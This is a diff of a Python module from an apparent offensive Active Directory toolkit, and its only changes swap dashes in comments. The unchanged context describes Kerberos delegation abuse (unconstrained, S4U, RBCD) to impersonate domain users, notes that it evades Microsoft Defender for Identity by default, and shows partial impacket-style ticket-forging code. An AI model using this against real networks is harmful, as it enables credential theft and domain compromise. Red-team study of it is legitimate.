@@ -1,12 +1,12 @@
 """
-Kerberos Delegation Abuse — ad.delegation_abuse
-MITRE: T1558.001 — Steal or Forge Kerberos Tickets: Golden Ticket
-       T1134.001 — Access Token Manipulation: Token Impersonation/Theft
+Kerberos Delegation Abuse - ad.delegation_abuse
+MITRE: T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket
+       T1134.001 - Access Token Manipulation: Token Impersonation/Theft
 
 Three delegation techniques in one module:
-  1. UNCONSTRAINED — Computer with unconstrained delegation stores TGTs in memory
-  2. CONSTRAINED S4U — S4U2Self + S4U2Proxy to impersonate any user to a service
-  3. RBCD — Resource-Based Constrained Delegation via GenericWrite on computer object
+  1. UNCONSTRAINED - Computer with unconstrained delegation stores TGTs in memory
+  2. CONSTRAINED S4U - S4U2Self + S4U2Proxy to impersonate any user to a service
+  3. RBCD - Resource-Based Constrained Delegation via GenericWrite on computer object
 
 RBCD attack chain (most common):
   ad.enum_acl finds GenericWrite on WORKSTATION$ →
@@ -17,7 +17,7 @@ RBCD attack chain (most common):
 Prerequisites: Domain credentials. For RBCD: computer account + GenericWrite
                on target computer (identified by ad.enum_acl).
 
-OPSEC: MEDIUM — LDAP write + Kerberos TGS requests. Does not trigger MDI by default.
+OPSEC: MEDIUM - LDAP write + Kerberos TGS requests. Does not trigger MDI by default.
 """
 from __future__ import annotations
 
@@ -58,7 +58,7 @@ logger = get_logger("ares.modules.ad.delegation_abuse")
 )
 class DelegationAbuseModule(BaseModule[DelegationAbuseParams, ModuleResult]):
     """
-    ad.delegation_abuse — Exploit unconstrained / constrained / RBCD Kerberos delegation. RBCD: GenericWrite on computer →
+    ad.delegation_abuse - Exploit unconstrained / constrained / RBCD Kerberos delegation. RBCD: GenericWrite on computer →
 
     OPSEC: MEDIUM
     MITRE: "T1558.001", "T1134.001"
@@ -104,7 +104,7 @@ class DelegationAbuseModule(BaseModule[DelegationAbuseParams, ModuleResult]):
         if mode == "rbcd":
             if not ctx.params.get("target_computer"):
                 raise ModuleValidationError(
-                    "RBCD mode requires 'target_computer' (e.g. WORKSTATION01$) — "
+                    "RBCD mode requires 'target_computer' (e.g. WORKSTATION01$) - "
                     "the computer object where GenericWrite was found by ad.enum_acl.",
                     module_id=self.MODULE_ID, field="target_computer",
                 )
@@ -399,7 +399,7 @@ class DelegationAbuseModule(BaseModule[DelegationAbuseParams, ModuleResult]):
         """
         RBCD attack:
         1. Write msDS-AllowedToActOnBehalfOfOtherIdentity on target_computer
-           (requires GenericWrite — confirmed by ad.enum_acl)
+           (requires GenericWrite - confirmed by ad.enum_acl)
         2. S4U2Self: get service ticket for impersonate_user to our fake service
         3. S4U2Proxy: exchange for service ticket to target_service/target_computer
         4. Save .ccache and return path
@@ -422,7 +422,7 @@ class DelegationAbuseModule(BaseModule[DelegationAbuseParams, ModuleResult]):
                 aesKey=b"", kdcHost=dc,
             )
 
-            # Step 2: S4U2Self — get ticket for impersonate_user to ourselves
+            # Step 2: S4U2Self - get ticket for impersonate_user to ourselves
             s4u_self_name = Principal(
                 username,
                 type=constants.PrincipalNameType.NT_PRINCIPAL.value,
@@ -437,7 +437,7 @@ class DelegationAbuseModule(BaseModule[DelegationAbuseParams, ModuleResult]):
                 sessionKey=session_key,
             )
 
-            # Step 3: S4U2Proxy — exchange for service ticket to target
+            # Step 3: S4U2Proxy - exchange for service ticket to target
             spn_target = Principal(
                 f"{target_service}/{target_computer}",
                 type=constants.PrincipalNameType.NT_SRV_INST.value,
@@ -459,7 +459,7 @@ class DelegationAbuseModule(BaseModule[DelegationAbuseParams, ModuleResult]):
             cc = CCache()
             cc.saveFile(ccache_path)
             logger.info("rbcd_ticket_saved", path=ccache_path,
-                        warning="Credential artifact on disk — delete after use")
+                        warning="Credential artifact on disk - delete after use")
             return ccache_path
 
         except Exception as exc:
